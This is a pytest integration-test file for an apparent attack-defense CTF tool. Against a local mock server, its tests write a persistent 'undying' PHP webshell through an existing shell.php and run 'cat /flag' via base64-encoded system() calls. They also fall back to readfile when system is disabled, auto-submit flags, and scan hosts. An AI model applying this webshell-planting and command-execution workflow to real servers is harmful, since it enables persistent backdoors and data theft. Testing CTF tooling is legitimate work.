# -*- coding: utf-8 -*-
import base64
import json
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

import pytest

import config
import core
import ui_qt

FLAG = 'flag{integration_ok}'
NATIVE_FLAG = 'flag{native_ok}'


class Handler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def log_message(self, *args):
        pass

    # ---------------- 工具 ----------------
    def _body(self):
        length = int(self.headers.get('Content-Length') or 0)
        if not length:
            return ''
        return self.rfile.read(length).decode('utf-8', 'ignore')

    def _send(self, body='ok', status=200, ctype='text/plain; charset=utf-8'):
        data = body.encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass

    def _submit_reply(self, flag):
        if flag == FLAG:
            return json.dumps({'code': 0, 'msg': 'ok'})
        if flag == 'flag{bad}':
            return json.dumps({'code': 1, 'msg': 'flag error'})
        return 'received'

    # ---------------- 路由 ----------------
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/upload/.data.php':
            self._send('ok')
            return
        if parsed.path == '/submit/get':
            qs = parse_qs(parsed.query)
            self.server.state['last_get'] = qs
            self._send(self._submit_reply((qs.get('flag') or [''])[0]),
                       200, 'application/json')
            return
        self._send('ok')

    def do_POST(self):
        parsed = urlparse(self.path)
        body = self._body()

        if parsed.path == '/shell.php':
            form = parse_qs(body)
            payload = (form.get('cmd') or [''])[0]
            self.server.state['entry_payload'] = payload
            match = re.search(r"base64_decode\('([A-Za-z0-9+/=]+)'\)", payload)
            if match:
                code = base64.b64decode(match.group(1)).decode('utf-8')
                with open(self.server.state['drop_path'], 'w',
                          encoding='utf-8') as f:
                    f.write(code)
            self._send('ok')
            return

        if parsed.path == '/upload/-.php':
            form = parse_qs(body)
            php = (form.get('a') or [''])[0]
            self.server.state['last_php'] = php
            if 'readfile' in php:
                self._send('angelkat%sangelkat' % NATIVE_FLAG)
                return
            match = re.search(r"system\(base64_decode\('([^']+)'\)\)", php)
            if match:
                cmd = base64.b64decode(match.group(1)).decode('utf-8')
                self.server.state['last_cmd'] = cmd
                if 'cat /flag' in cmd:
                    self._send('angelkat%sangelkat' % FLAG)
                    return
            self._send('angelkat')
            return

        if parsed.path == '/submit/form':
            form = parse_qs(body)
            self.server.state['last_form'] = form
            self._send(self._submit_reply((form.get('flag') or [''])[0]),
                       200, 'application/json')
            return

        if parsed.path == '/submit/json':
            try:
                data = json.loads(body or '{}')
            except ValueError:
                data = {}
            self.server.state['last_json'] = data
            self._send(self._submit_reply(str(data.get('flag', ''))),
                       200, 'application/json')
            return

        if parsed.path == '/submit/forbidden':
            self._send('forbidden', 403)
            return

        self._send('ok')


@pytest.fixture()
def server(temp_config):
    httpd = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
    httpd.daemon_threads = True
    httpd.state = {
        'drop_path': str(temp_config / 'dropped.php'),
        'entry_payload': '',
        'last_php': '',
        'last_cmd': '',
        'last_form': None,
        'last_json': None,
        'last_get': None,
    }
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield httpd, httpd.server_address[1], temp_config / 'dropped.php'
    finally:
        httpd.shutdown()
        httpd.server_close()


def _options(port):
    return {
        'url': 'http://127.0.0.1/shell.php',
        'url_type': '代码执行',
        'pass_type': 'POST传参密码',
        'pass_word': 'cmd',
        'code': '<?php echo "dropped"; ?>',
    }


@pytest.fixture()
def prepared(server):
    httpd, port, drop = server
    config.不死马路径 = str(drop)
    config.运行的不死马路径 = 'upload/.data.php'
    config.木马文件名 = 'upload/-.php'
    config.木马的pass密码 = 'testpass'
    config.木马密码 = 'a'
    return httpd, port, drop


def test_write_and_flag_and_check(prepared):
    httpd, port, drop = prepared
    session = core.build_session()
    target = core.Target('127.0.0.1', port)

    ok, detail = core.write_busima_ex(session, target, _options(port))
    assert ok, detail
    assert drop.exists()
    assert drop.read_text(encoding='utf-8') == '<?php echo "dropped"; ?>'
    assert 'file_put_contents' in httpd.state['entry_payload']
    assert not httpd.state['entry_payload'].startswith('`')

    flag, detail = core.fetch_flag_ex(
        session, 'http://127.0.0.1:%d' % port, 'cat /flag')
    assert flag == FLAG
    assert '自定义命令' in detail
    assert httpd.state['last_cmd'] == 'cat /flag'

    alive, detail = core.check_shell(session, 'http://127.0.0.1:%d' % port)
    assert alive is True
    assert detail == 'ok'


def test_fetch_native_when_system_blocked(prepared):
    # 模拟 disable_functions：system 返回空，readfile 能读到 flag
    httpd, port, drop = prepared
    session = core.build_session()
    flag, detail = core.fetch_flag_ex(
        session, 'http://127.0.0.1:%d' % port, 'true')
    # 自定义命令无 flag 时走原生路径；mock 的 readfile 返回 NATIVE_FLAG
    assert flag == NATIVE_FLAG
    assert '原生' in detail


def test_submit_form_json_get(prepared):
    httpd, port, drop = prepared
    session = core.build_session()
    host = '127.0.0.1:%d' % port

    form_raw = ('POST /submit/form HTTP/1.1\r\nHost: %s\r\n'
                'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
                'foo=1&flag=placeholder' % host)
    resp = core.submit_flag_ex(session, form_raw, FLAG, 'flag')
    verdict, _ = core.judge_submission(resp)
    assert verdict == 'success'
    assert httpd.state['last_form']['foo'] == ['1']
    assert httpd.state['last_form']['flag'] == [FLAG]

    json_raw = ('POST /submit/json HTTP/1.1\r\nHost: %s\r\n'
                'Content-Type: application/json\r\n\r\n{"a":1}' % host)
    resp = core.submit_flag_ex(session, json_raw, FLAG, 'flag')
    assert core.judge_submission(resp)[0] == 'success'
    assert httpd.state['last_json']['a'] == 1
    assert httpd.state['last_json']['flag'] == FLAG

    get_raw = ('GET /submit/get?x=1 HTTP/1.1\r\nHost: %s\r\n\r\n' % host)
    resp = core.submit_flag_ex(session, get_raw, FLAG, 'flag')
    assert core.judge_submission(resp)[0] == 'success'
    assert httpd.state['last_get']['x'] == ['1']
    assert httpd.state['last_get']['flag'] == [FLAG]


def test_submit_fail_unknown_forbidden(prepared):
    httpd, port, drop = prepared
    session = core.build_session()
    host = '127.0.0.1:%d' % port
    raw = ('POST /submit/form HTTP/1.1\r\nHost: %s\r\n'
           'Content-Type: application/x-www-form-urlencoded\r\n\r\n' % host)

    resp = core.submit_flag_ex(session, raw, 'flag{bad}', 'flag')
    assert core.judge_submission(resp)[0] == 'fail'

    resp = core.submit_flag_ex(session, raw, 'flag{unknown}', 'flag')
    assert core.judge_submission(resp)[0] == 'unknown'

    forbidden = ('POST /submit/forbidden HTTP/1.1\r\nHost: %s\r\n'
                 'Content-Type: application/x-www-form-urlencoded\r\n\r\n' % host)
    resp = core.submit_flag_ex(session, forbidden, FLAG, 'flag')
    assert resp.status_code == 403
    assert core.judge_submission(resp)[0] == 'fail'


def test_scan_finds_local_server(prepared):
    httpd, port, drop = prepared
    alive = core.scan_hosts('127.0.0.', '127.0.0.2', timeout=0.2,
                            workers=32, port=port)
    assert '127.0.0.1' in alive
    assert '127.0.0.2' not in alive


def _wait_ui(win, app, timeout=20):
    deadline = time.time() + timeout
    while win._thread is not None and time.time() < deadline:
        app.processEvents()
        time.sleep(0.005)
    app.processEvents()
    assert win._thread is None
    assert win._running is False


def test_ui_end_to_end_write_then_submit(prepared, qapp):
    httpd, port, drop = prepared
    win = ui_qt.MainWindow()
    try:
        win.show()
        qapp.processEvents()
        win.txt_ips.setPlainText('127.0.0.1:%d' % port)
        win.ed_url.setText('http://127.0.0.1/shell.php')
        win.txt_busima.setPlainText('<?php echo "dropped"; ?>')

        win.on_write()
        _wait_ui(win, qapp)
        assert win.tbl_write.rowCount() == 1
        assert win._rows['write'][0][1] == '成功'
        assert drop.exists()

        win.txt_request.setPlainText(
            'POST /submit/form HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n'
            'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
            'foo=1&flag=placeholder' % port)
        win.ed_param.setText('flag')
        win.ed_cmd.setText('cat /flag')
        win.on_submit()
        _wait_ui(win, qapp)

        key = '127.0.0.1:%d' % port
        assert win.tbl_flag.rowCount() == 1
        assert win._last_flag[key] == FLAG
        assert win._submitted[key] == FLAG
        assert win._rows['flag'][0][2] == '成功'
    finally:
        win.close()
        qapp.processEvents()
